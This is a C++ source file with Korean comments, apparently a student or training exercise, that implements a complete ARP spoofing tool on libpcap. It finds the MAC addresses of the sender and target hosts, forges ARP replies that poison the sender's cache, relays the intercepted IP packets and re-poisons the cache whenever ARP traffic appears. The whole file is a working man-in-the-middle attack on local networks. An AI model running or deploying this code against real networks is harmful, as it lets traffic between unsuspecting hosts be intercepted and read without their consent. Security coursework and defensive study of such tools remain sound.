// arp-spoof-main.cpp

#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "get_mac_ip.h"

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct Session
{
    Ip   senderIp;
    Mac  senderMac;
    Ip   targetIp;
    Mac  targetMac;

    // sender를 속이는 변조된 arp패킷
    // 지속적으로 감염을 시켜야 하므로 구조체 안에 만들었다.
    EthArpPacket arpInfectPacket;
};

Mac myMac;
Ip myIp;

// senderIp를 주면 ARP리퀘스트를 통하여 senderMac을 반환한다.
Mac requestMac(pcap_t* handle, Ip senderIp)
{
    // ARP Request 패킷 제작
    EthArpPacket arpRequestPacket;

    arpRequestPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    arpRequestPacket.eth_.smac_ = myMac;
    arpRequestPacket.eth_.type_ = htons(EthHdr::Arp);

    arpRequestPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    arpRequestPacket.arp_.pro_ = htons(EthHdr::Ip4);
    arpRequestPacket.arp_.hln_ = Mac::SIZE;
    arpRequestPacket.arp_.pln_ = Ip::SIZE;
    arpRequestPacket.arp_.op_ = htons(ArpHdr::Request);  // 리퀘스트
    arpRequestPacket.arp_.smac_ = myMac;
    arpRequestPacket.arp_.sip_ = htonl(myIp);
    arpRequestPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
    arpRequestPacket.arp_.tip_ = htonl(senderIp);

    // ARP Request 패킷 전송
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpRequestPacket), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    // ARP Reply 패킷 수신
    EthArpPacket* recvPacket = nullptr;
    
    while(true)
    {
        struct pcap_pkthdr* header;
        const  u_char*      packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        
        recvPacket = (EthArpPacket*)packet;  // 패킷을 가져와서
        
        if(recvPacket->eth_.type() != EthHdr::Arp)
            continue;  // ARP패킷이 아니면 건너 뛴다.
        if(recvPacket->arp_.op() != ArpHdr::Reply)
            continue;  // ARP Reply가 아니면 건너 뛴다.
        if(recvPacket->arp_.sip() != senderIp)
            continue;  // sender IP가 아니면 건너 뛴다.
        
        break;  // 찾았다!!
    }

    // senderMac 겟또
    return Mac(recvPacket->arp_.smac_);
}

// session구조체 내의 arpInfectPacket을 지지고 볶고 해서 만든다.
void makeArpInfectPacket(Session* session)
{
    // ARP infect 패킷 제작
    session->arpInfectPacket.eth_.dmac_ = session->senderMac;
    session->arpInfectPacket.eth_.smac_ = myMac;
    session->arpInfectPacket.eth_.type_ = htons(EthHdr::Arp);

    session->arpInfectPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    session->arpInfectPacket.arp_.pro_ = htons(EthHdr::Ip4);
    session->arpInfectPacket.arp_.hln_ = Mac::SIZE;
    session->arpInfectPacket.arp_.pln_ = Ip::SIZE;
    session->arpInfectPacket.arp_.op_ = htons(ArpHdr::Reply);  // 리플라이
    session->arpInfectPacket.arp_.smac_ = myMac;
    session->arpInfectPacket.arp_.sip_ = htonl(session->targetIp);  // 내가 target이다...
    session->arpInfectPacket.arp_.tmac_ = session->senderMac;
    session->arpInfectPacket.arp_.tip_ = htonl(session->senderIp);
}

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc%2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    // 나의 MAC주소, IP주소 가져오기
    char myMacStr[32] = {0, };
    char myIpStr[32] = {0, };
    if(get_mac(myMacStr, dev) < 0)
    {
        fprintf(stderr, "get_mac() Error!!\n");
        return -1;
    }
    if(get_ip_addr(myIpStr, dev) < 0)
    {
        fprintf(stderr, "get_ip_addr() Error!!\n");
        return -1;
    }
    myMac = Mac(myMacStr);
    myIp = Ip(myIpStr);


    int numOfSession = (argc-2) / 2;
    printf("number of session: %d\n", numOfSession);

    // 세션 배열 할당
    Session* session = new Session[numOfSession];
    if(session == nullptr)
    {
        fprintf(stderr, "Out of Memory!!\n");
        return -1;
    }

    // 세션 IP 입력
    for(int i = 2; i < argc; i+=2)
    {
        session[(i/2)-1].senderIp = Ip(argv[i]);
        session[(i/2)-1].targetIp = Ip(argv[i+1]);
        printf("[Sess %d] sender IP = %s\n", (i/2)-1, argv[i]);
        printf("[Sess %d] target IP = %s\n", (i/2)-1, argv[i+1]);
    }
    
    // sender 및 target MAC주소 알아오기
    // 그리고 ARP infect 패킷 생성
    for(int i = 0; i < numOfSession; i++)
    {
        session[i].senderMac = requestMac(handle, session[i].senderIp);
        session[i].targetMac = requestMac(handle, session[i].targetIp);
        makeArpInfectPacket(&session[i]);
    }
    
    // 모든 준비는 끝났다!!
    printf("all ready...\n");

    // ARP infect 패킷 전송
    for(int i = 0; i < numOfSession; i++)
    {
        int res = pcap_sendpacket(
            handle, 
            reinterpret_cast<const u_char*>( &(session[i].arpInfectPacket) ), 
            sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }

    // relay while loop
    while(true)
    {
        struct pcap_pkthdr* header;
        const  u_char*      packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        // 패킷을 가져와서
        EthHdr*      spoofedPacket = (EthHdr*)packet;
        bpf_u_int32  spoofedPacketSize = header->caplen;

        // 패킷 하나를 두고 세션 모두와 비교한다.
        for(int i = 0; i < numOfSession; i++)
        {
            if(spoofedPacket->smac() != session[i].senderMac)
                continue;  // sender의 MAC이 아니면 건너뛴다!
            
            if(spoofedPacket->dmac() != myMac)
                continue;  // 나한테 온게 아니면 건너뛴다!

            // IP패킷이면 릴레이
            if(spoofedPacket->type() == EthHdr::Ip4)
            {
                // dst mac을 target MAC으로 바꾼다.
                spoofedPacket->dmac_ = session[i].targetMac;
                // src mac을 나의 MAC으로 바꾼다.
                spoofedPacket->smac_ = myMac;

                // 릴레이 IP패킷 전송
                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(spoofedPacket), spoofedPacketSize);
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }

                printf("[Sess %d] spoofed IP packet is relayed: %u bytes \n", i, spoofedPacketSize);
            }

            // ARP패킷이면
            else if(spoofedPacket->type() == EthHdr::Arp)
            {
                // 다시한번 ARP infect 패킷 전송
                res = pcap_sendpacket(
                    handle,
                    reinterpret_cast<const u_char*>( &(session[i].arpInfectPacket) ),
                    sizeof(EthArpPacket));
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }

                printf("Sess %d] resend infect packet\n", i);
            }

        }
        // for loop

    }
    // relay while loop

    delete[] session;
    session = nullptr;

    pcap_close(handle);
}
